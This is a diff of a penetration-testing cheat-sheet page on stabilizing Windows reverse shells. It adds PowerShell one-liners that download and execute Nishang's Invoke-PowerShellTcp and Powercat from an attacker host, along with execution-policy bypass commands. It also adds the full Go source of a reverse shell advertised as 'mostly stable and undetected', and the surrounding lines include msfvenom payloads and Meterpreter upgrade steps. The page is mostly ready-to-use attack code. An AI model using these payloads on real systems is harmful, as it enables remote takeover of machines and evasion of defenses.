@@ -1,6 +1,6 @@
 ---
 sidebar_position: 1
-title: Terminal
+title: Stabilization
 description: Windows Shell Stabilization
 keywords: [shell stabilization windows, rlwrap, metasploit shell stabilization]
 ---
@@ -9,21 +9,84 @@ import Tabs from '@theme/Tabs';
 import TabItem from '@theme/TabItem';
 
 
-## CMD
-
 ```batch
 :: In Windows we can use rlwrap before Connecting to the Target Machine
 rlwrap nc -nvlp <PORT>
 ```
 
+<br/>
+
+## CMD - PSH
+
+<a class="button button--outline button--info" href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">Invoke-PowerShellTcp</a> &nbsp; 
+<a class="button button--outline button--info" href="https://github.com/besimorhino/powercat/blob/master/powercat.ps1">Powercat</a>
+
+
+<br/>
+<br/>
+
+
+<Tabs>
+  <TabItem value="cmd_one" label="CMD"> 
+    <div style={{color: 'red'}}>
+
 ```powershell
-# After connecting to the Target we can Upload - Execute Invoke-PowerShellTcp [Nishang]
-# [An interactive PowerShell Reverse Connect]
-powershell IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:PORT/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress $ATTACKER_IP -Port $PORT
+# [Invoke-PowerShellTcp] Download - Execute 
+powershell IEX "(New-Object Net.WebClient).DownloadString('http://IP:PORT/Invoke-PowerShellTcp.ps1');" "Invoke-PowerShellTcp -Reverse -IPAddress IP -Port PORT"
+
+# [Powercat] Download - Execute 
+powershell IEX "(New-Object Net.WebClient).DownloadString('http://IP:PORT/Powercat.ps1');" "Powercat -c IP -p PORT -e cmd"
 ```
 
-- **Alternatively use one of the `MSFVENOM PAYLOADS:`** <a class="button button--outline button--warning" href="https://infosec-docs.pages.dev/windows/shell-win#payloads">PAYLOADS</a>
+```batch
+:: [Invoke-PowerShellTcp] Import - Execute
+powershell -command "Set-ExecutionPolicy Bypass -Scope process -Force;. .\Invoke-PowerShellTcp.ps1;Invoke-PowerShellTcp -Reverse -IPAddress IP -Port PORT"
 
+:: [Powercat] Import - Execute
+powershell -command "Set-ExecutionPolicy Bypass -Scope process -Force;. .\Powercat.ps1;Powercat -c IP -p PORT -e cmd"
+```
+
+</div>
+  </TabItem>
+  <TabItem value="cmd_two" label="Invoke-PowerShellTcp">
+    <div style={{color: 'red'}}>
+
+```powershell
+# Download - Execute
+powershell IEX "(New-Object Net.WebClient).DownloadString('http://IP:PORT/Invoke-PowerShellTcp.ps1');" "Invoke-PowerShellTcp -Reverse -IPAddress IP -Port PORT"
+
+
+# Import - Execute
+Set-ExecutionPolicy Bypass -Scope process -Force
+. .\Invoke-PowerShellTcp.ps1
+Invoke-PowerShellTcp -Reverse -IPAddress IP -Port PORT
+
+# List Execution Policy Rules
+Get-ExecutionPolicy -List | Format-Table -AutoSize
+```
+
+</div>
+  </TabItem>
+    <TabItem value="cmd_three" label="Powercat"> 
+    <div style={{color: 'red'}}>
+
+```powershell
+# Download - Execute
+powershell IEX "(New-Object Net.WebClient).DownloadString('http://IP:PORT/Powercat.ps1');" "Powercat -c IP -p PORT -e cmd"
+
+
+# Import - Execute
+Set-ExecutionPolicy Bypass -Scope process -Force
+. .\Powercat.ps1
+Powercat -c IP -p PORT -e cmd
+
+# List Execution Policy Rules
+Get-ExecutionPolicy -List | Format-Table -AutoSize
+```
+
+</div>
+  </TabItem>
+</Tabs>
 
 ### Interface
 
@@ -34,6 +97,7 @@ chcp 65001
 :: Set Keyboard Layout
 Set-WinUserLanguageList -LanguageList us-US -force
 ```
+
 
 <br/>
 
@@ -54,7 +118,6 @@ set LPORT
 set PAYLOAD windows/shell/reverse_tcp
 ```
 
-<br/>
 
 ### PAYLOADS
 
@@ -93,7 +156,6 @@ msfvenom -p windows/shell_reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=
   </TabItem>
 </Tabs>
 
-<br/>
 
 ### Upgrading To Meterpreter
 
@@ -124,3 +186,97 @@ run session=SESSION win_transfer=POWERSHELL
 :: [Method 3]
 run session=SESSION win_transfer=VBS
 ```
+
+<br/>
+
+## GO Reverse Shell
+
+:::info Features Missing
+
+**Mostly Stable and Undetected. Works on `Windows - Linux`**.
+
+:::
+
+
+<br/>
+
+```batch
+:: Build
+:: This is going to Generate a Binary Named [GoRevShell.exe]
+env GOOS=windows GOARCH=386 go build GoRevShell.go
+
+:: Usage
+GoRevShell.exe -i <IP> -p <PORT>
+
+:: Catching The Shell
+rlwrap nc -nvlp <PORT>
+```
+
+<details><summary>SOURCE</summary>
+<p>
+
+```go
+package main
+
+import (
+	"bufio"
+	"flag"
+	"fmt"
+	"net"
+	"os"
+	"os/exec"
+	"runtime"
+)
+
+func execute(msg string) (string, []string) {
+	var exe string
+	os := runtime.GOOS
+
+	if os == "windows" {
+		exe = "cmd"
+	} else if os == "linux" {
+		exe = "/bin/bash"
+	} else {
+		fmt.Println("Unknown Arch. Terminating.")
+	}
+
+	args := []string{}
+	if exe == "cmd" {
+		args = append(args, "/C")
+	} else {
+		args = append(args, "-c")
+	}
+
+	args = append(args, msg)
+	return exe, args
+}
+
+func main() {
+	args := os.Args
+	if len(args) < 2 {
+		fmt.Println("Usage: [OPTIONS]\n\n GO Reverse Shell\n\nOptions:\n -i HOST -p PORT")
+		return
+	}
+
+	I_P := flag.String("i", "", "HOST")
+	L_PORT := flag.String("p", "", "PORT")
+	flag.Parse()
+
+	conn, _ := net.Dial("tcp", fmt.Sprintf("%s:%s", *I_P, *L_PORT))
+	for {
+		cwd, _ := os.Getwd()
+		fmt.Fprintf(conn, "\n%s> ", cwd)
+		msg, _ := bufio.NewReader(conn).ReadString('\n')
+		exe, args := execute(msg)
+		out, err := exec.Command(exe, args...).Output()
+		if err != nil {
+			fmt.Println(conn, "\n\n%s\n", err)
+		}
+		fmt.Fprintf(conn, "%s", out)
+	}
+}
+```
+
+</p>
+</details>
+
